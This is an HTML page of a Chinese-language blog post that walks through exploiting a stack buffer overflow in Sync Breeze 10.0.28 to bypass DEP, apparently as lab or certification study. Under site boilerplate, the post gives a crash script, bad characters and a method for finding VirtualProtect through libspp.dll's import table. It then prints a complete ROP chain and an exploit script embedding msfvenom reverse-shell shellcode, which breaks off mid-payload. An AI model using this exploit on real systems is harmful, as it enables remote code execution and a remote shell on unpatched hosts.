@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"n0maj1o24.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="实验环境 Windows Server 2019（10.0.17763 N&#x2F;A Build 17763）, DEP默认为AlwaysOn。  给了一个能crash程序的模板脚本： 123456789101112131415161718192021222324252627282930313233#!&#x2F;usr&#x2F;bin&#x2F;pythonimport socketimport systry:  server">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sync Breeze 10.0.28 bypass DEP">
+<meta property="og:url" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/index.html">
+<meta property="og:site_name" content="Technical Memorandum">
+<meta property="og:description" content="实验环境 Windows Server 2019（10.0.17763 N&#x2F;A Build 17763）, DEP默认为AlwaysOn。  给了一个能crash程序的模板脚本： 123456789101112131415161718192021222324252627282930313233#!&#x2F;usr&#x2F;bin&#x2F;pythonimport socketimport systry:  server">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/01.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/02.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/03.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/04.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/05.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/06.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/iat.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/rev_shell.png">
+<meta property="article:published_time" content="2022-05-27T18:47:55.000Z">
+<meta property="article:modified_time" content="2022-05-27T11:04:23.921Z">
+<meta property="article:author" content="n0maj1o24">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Stack Based Overflows">
+<meta property="article:tag" content="DEP">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="SEH">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/01.png">
+
+<link rel="canonical" href="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Sync Breeze 10.0.28 bypass DEP | Technical Memorandum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Technical Memorandum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Sync Breeze 10.0.28 bypass DEP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-27 18:47:55 / 修改时间：11:04:23" itemprop="dateCreated datePublished" datetime="2022-05-27T18:47:55Z">2022-05-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows-Exploitation/" itemprop="url" rel="index"><span itemprop="name">Windows Exploitation</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>实验环境 <code>Windows Server 2019（10.0.17763 N/A Build 17763）</code>, <code>DEP</code>默认为<em>AlwaysOn</em>。 </p>
+<p>给了一个能<code>crash</code>程序的模板脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  server = sys.argv[<span class="number">1</span>]</span><br><span class="line">  port = <span class="number">80</span></span><br><span class="line">  size = <span class="number">800</span></span><br><span class="line">  inputBuffer = <span class="string">b"A"</span> * size</span><br><span class="line">  content = <span class="string">b"username="</span> + inputBuffer + <span class="string">b"&amp;password=A"</span></span><br><span class="line"></span><br><span class="line">  buffer = <span class="string">b"POST /login HTTP/1.1\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Host: "</span> + server.encode() + <span class="string">b"\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Accept-Language: en-US,en;q=0.5\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Referer: http://10.11.0.22/login\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Connection: close\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Content-Type: application/x-www-form-urlencoded\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Content-Length: "</span>+ str(len(content)).encode() + <span class="string">b"\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"\r\n"</span></span><br><span class="line">  buffer += content</span><br><span class="line"></span><br><span class="line">  print(<span class="string">"Sending evil buffer..."</span>)</span><br><span class="line">  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">  s.connect((server, port))</span><br><span class="line">  s.send(buffer)</span><br><span class="line">  s.close()</span><br><span class="line">  </span><br><span class="line">  print(<span class="string">"Done!"</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">  print(<span class="string">"Could not connect!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>offset</code>为<code>780</code>，后续需要跟<code>4bytes</code>的占位符，才能让<code>ESP</code>指向后续字符的开头，不然会跳过后续字符开头的<code>4bytes</code>。坏字符为<code>\x00\x0a\x0d\x25\x26\x2b\x3d</code>。这些比较简单，就不说了。</p>
+<p>先来看看未开启<code>ASLR</code>的模块：</p>
+<p><img src="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/01.png" alt="BOF"></p>
+<p>结合坏字符，这里能用的模块只有<code>libspp.dll</code>。有个小问题出现了，在<code>libspp.dll</code>的<code>IAT</code>中找不到<code>VirtualAllocStub,WriteProcessMemoryStub,VirtualProtectStub</code>类似这样的函数。</p>
+<p><strong>小知识：模块<code>IAT</code>中各个函数的偏移是一定的，不同函数之间的距离也是一定的，两者不会随函数地址的变化而变化。</strong></p>
+<p><img src="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/02.png" alt="BOF"></p>
+<p><code>VirutalProtect</code>函数源于<code>kernel32.dll</code>，虽然<code>libspp.dll</code>中<code>IAT</code>没有，但是可以用其他导入的<code>kernel32</code>中的函数计算得到<code>VirtualProtect</code>的实际地址。</p>
+<p>在<code>windbg</code>中来验证一下：</p>
+<p>获取<code>CreateFileA</code>和<code>VirtualProtectStub</code>的地址：</p>
+<p><img src="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/03.png" alt="BOF"></p>
+<p>计算二者之差（这个值是固定的，但是不同版本的系统这个值会不同）：</p>
+<p><img src="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/04.png" alt="BOF"></p>
+<p>根据<code>libspp.dll</code>中<code>IAT</code>的信息，获取<code>CreateFileA</code>的实际地址：</p>
+<p><img src="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/05.png" alt="BOF"></p>
+<p>得到<code>VirtualProtectStub</code>的实际地址：</p>
+<p><img src="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/06.png" alt="BOF"></p>
+<p>利用<code>libspp.dll IAT</code>中<code>CreateFileA</code>的地址找到<code>VirtualProtectStub</code>地址的方法就介绍完了。</p>
+<p>以上是手动操作，其实也可利用脚本来进行，外国友人写了一个寻找函数<code>IAT</code>地址的<a href="https://github.com/affix/osed-scripts/blob/main/find-function-iat.py" target="_blank" rel="noopener">脚本</a>。</p>
+<p><img src="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/iat.png" alt="BOF"></p>
+<p>所需的知识已经准备就绪，接下来就是构建<code>ROP Chain</code>了。开始我想用<code>mona</code>自己生成，但是生成出来的R<code>OP Chain</code>不完整，而且非常冗长。我一般会在它的基础上做一些更改，修改成一个简洁的<code>ROP Chain</code>，或者会调整各寄存器的顺序，让原本无法生成<code>ROP Chain</code>变成可以顺利生成。</p>
+<p>首先，需要用<code>rp++</code>生成<code>ROP Gadget</code>集合，然后需要去掉包含坏字符的<code>ROP Gadget</code>。</p>
+<p>这里用到的过滤脚本如下：</p>
+<p>1.<a href="https://github.com/0xbad53c/osed-tools/blob/main/filter-ropfile.py" target="_blank" rel="noopener">filter-ropfile.py</a></p>
+<p>2.<a href="https://github.com/epi052/osed-scripts/blob/main/find-gadgets.py" target="_blank" rel="noopener">find-gadgets.py</a></p>
+<p>两个差不多，可以结合使用。</p>
+<p>难点在<code>ESI</code>值（它保存<code>VirutalProtectStub</code>的地址）的生成，主要关注解引用，这样才能获取到<code>CreateFileA</code>的地址，进而获取<code>VirutalProtectStub</code>的地址：</p>
+<p>注：说好的<code>VirutalProtect</code>，为何变成了<code>VirtualProtect</code>，因为<code>VirtualProtect</code>最终调用的是<code>VirutalProtectStub</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#[---INFO:gadgets_to_set_esi:---]</span><br><span class="line">0x1002f729,   # pop eax; ret;  :: libspp.dll</span><br><span class="line">0x10168060,   # IAT KERNEL32!CreateFileA  libspp.dll</span><br><span class="line">0x1014dc4c,   # mov eax,  [eax] ; ret ; (1 found)</span><br><span class="line">0x100cb4d4,   # xchg eax, edx ; ret ; (1 found)     </span><br><span class="line">0x1002f729,   # pop eax; ret;  :: libspp.dll</span><br><span class="line">0xffffd070,   # offset &#x3D; VirtualProtectStub - CreateFileA </span><br><span class="line">0x1003f9f9,   # add eax, edx ; retn 0x0004 ; (1 found)</span><br><span class="line">0x100121b5,   # xchg eax, esi ; cwde ; add bl, al ; mov eax, 0x02FAF080 ; ret ; (1 found)</span><br><span class="line">0x41414141,   # junk</span><br></pre></td></tr></table></figure>
+
+<p>完整的<code>ROP Chain</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_rop_chain</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x1002f729</span>,   <span class="comment"># pop eax; ret;  :: libspp.dll</span></span><br><span class="line">      <span class="number">0x10168060</span>,   <span class="comment"># IAT KERNEL32!CreateFileA  libspp.dll</span></span><br><span class="line">      <span class="number">0x1014dc4c</span>,   <span class="comment"># mov eax,  [eax] ; ret ; (1 found)</span></span><br><span class="line">      <span class="number">0x100cb4d4</span>,   <span class="comment"># xchg eax, edx ; ret ; (1 found)     </span></span><br><span class="line">      <span class="number">0x1002f729</span>,   <span class="comment"># pop eax; ret;  :: libspp.dll</span></span><br><span class="line">      <span class="number">0xffffd070</span>,   <span class="comment"># offset = VirtualProtectStub - CreateFileA </span></span><br><span class="line">      <span class="number">0x1003f9f9</span>,   <span class="comment"># add eax, edx ; retn 0x0004 ; (1 found)</span></span><br><span class="line">      <span class="number">0x100121b5</span>,   <span class="comment"># xchg eax, esi ; cwde ; add bl, al ; mov eax, 0x02FAF080 ; ret ; (1 found)</span></span><br><span class="line">      <span class="number">0x41414141</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x10129305</span>,  <span class="comment"># POP EBP # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x10129305</span>,  <span class="comment"># skip 4 bytes [libspp.dll]</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x1012b413</span>,  <span class="comment"># POP EAX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x1009904c</span>,  <span class="comment"># NEG EAX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x100cb4d4</span>,  <span class="comment"># xchg edx, eax; ret;  :: libspp.dll</span></span><br><span class="line">      <span class="number">0x10104e93</span>,  <span class="comment">#push edx ; or al, 0x5E ; xor eax, eax ; pop ebx ; ret</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x1012b413</span>,  <span class="comment"># POP EAX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x10078216</span>,  <span class="comment"># NEG EAX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x100cb4d4</span>,  <span class="comment"># XCHG EAX,EDX # RETN [libspp.dll] </span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x1015d439</span>,  <span class="comment"># POP ECX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x1020c95e</span>,  <span class="comment"># &amp;Writable location [libspp.dll]</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x10128eba</span>,  <span class="comment"># POP EDI # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x1010adf2</span>,  <span class="comment"># RETN (ROP NOP) [libspp.dll]</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x1014f55d</span>,  <span class="comment"># PUSHAD # RETN [libspp.dll]  </span></span><br><span class="line"></span><br><span class="line">      <span class="comment">#[---INFO:extras:---]</span></span><br><span class="line">      <span class="number">0x100bb515</span>,  <span class="comment"># ptr to 'push esp # ret ' [libspp.dll]</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.join(struct.pack(<span class="string">'&lt;I'</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br></pre></td></tr></table></figure>
+
+<p>完整的利用代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.91.137 LPORT=4444 EXITFUNC=thread -f python -v shellcode -b '\x00\x0a\x0d\x25\x26\x2b\x3d' </span></span><br><span class="line">shellcode =  <span class="string">b""</span></span><br><span class="line">shellcode += <span class="string">b"\xba\x6f\x57\xd7\xc5\xd9\xc3\xd9\x74\x24\xf4"</span></span><br><span class="line">shellcode += <span class="string">b"\x5e\x31\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e"</span></span><br><span class="line">shellcode += <span class="string">b"\x03\x39\x59\x35\x30\x39\x8d\x3b\xbb\xc1\x4e"</span></span><br><span class="line">shellcode += <span class="string">b"\x5c\x35\x24\x7f\x5c\x21\x2d\xd0\x6c\x21\x63"</span></span><br><span class="line">shellcode += <span class="string">b"\xdd\x07\x67\x97\x56\x65\xa0\x98\xdf\xc0\x96"</span></span><br><span class="line">shellcode += <span class="string">b"\x97\xe0\x79\xea\xb6\x62\x80\x3f\x18\x5a\x4b"</span></span><br><span class="line">shellcode += <span class="string">b"\x32\x59\x9b\xb6\xbf\x0b\x74\xbc\x12\xbb\xf1"</span></span><br><span class="line">shellcode += <span class="string">b"\x88\xae\x30\x49\x1c\xb7\xa5\x1a\x1f\x96\x78"</span></span><br><span class="line">shellcode += <span class="string">b"\x10\x46\x38\x7b\xf5\xf2\x71\x63\x1a\x3e\xcb"</span></span><br><span class="line">shellcode += <span class="string">b"\x18\xe8\xb4\xca\xc8\x20\x34\x60\x35\x8d\xc7"</span></span><br><span class="line">shellcode += <span class="string">b"\x78\x72\x2a\x38\x0f\x8a\x48\xc5\x08\x49\x32"</span></span><br><span class="line">shellcode += <span class="string">b"\x11\x9c\x49\x94\xd2\x06\xb5\x24\x36\xd0\x3e"</span></span><br><span class="line">shellcode += <span class="string">b"\x2a\xf3\x96\x18\x2f\x02\x7a\x13\x4b\x8f\x7d"</span></span><br><span class="line">shellcode += <span class="string">b"\xf3\xdd\xcb\x59\xd7\x86\x88\xc0\x4e\x63\x7e"</span></span><br><span class="line">shellcode += <span class="string">b"\xfc\x90\xcc\xdf\x58\xdb\xe1\x34\xd1\x86\x6d"</span></span><br><span class="line">shellcode += <span class="string">b"\xf8\xd8\x38\x6e\x96\x6b\x4b\x5c\x39\xc0\xc3"</span></span><br><span class="line">shellcode += <span class="string">b"\xec\xb2\xce\x14\x12\xe9\xb7\x8a\xed\x12\xc8"</span></span><br><span class="line">shellcode += <span class="string">b"\x83\x29\x46\x98\xbb\x98\xe7\x73\x3b\x24\x32"</span></span><br><span class="line">shellcode += <span class="string">b"\xd3\x6b\x8a\xed\x94\xdb\x6a\x5e\x7d\x31\x65"</span></span><br><span class="line">shellcode += <span class="string">b"\x81\x9d\x3a\xaf\xaa\x34\xc1\x38\x15\x60\x92"</span></span><br><span class="line">shellcode += <span class="string">b"\x31\xfd\x73\x24\x53\xa2\xfa\xc2\x39\x4a\xab"</span></span><br><span class="line">shellcode += <span class="string">b"\x5d\xd6\xf3\xf6\x15\x47\xfb\x2c\x50\x47\x77"</span></span><br><span class="line">shellcode += <span class="string">b"\xc3\xa5\x06\x70\xae\xb5\xff\x70\xe5\xe7\x56"</span></span><br><span class="line">shellcode += <span class="string">b"\x8e\xd3\x8f\x35\x1d\xb8\x4f\x33\x3e\x17\x18"</span></span><br><span class="line">shellcode += <span 